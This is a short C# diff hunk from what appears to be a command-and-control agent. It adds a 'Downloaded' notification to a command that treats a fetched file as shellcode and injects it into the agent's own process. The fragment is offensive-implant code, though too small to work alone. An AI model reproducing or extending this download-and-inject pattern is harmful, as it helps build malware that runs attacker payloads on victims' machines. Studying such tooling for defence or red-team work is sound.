@@ -29,6 +29,8 @@ namespace Agent.Commands
                 commm.SendResult(result);
             }).Result;
 
+            this.Notify(result, commm, $"{fileName} Downloaded");
+
             var shellcode = fileContent;
 
             var injectRes =  Injector.InjectSelfWithOutput(fileContent);
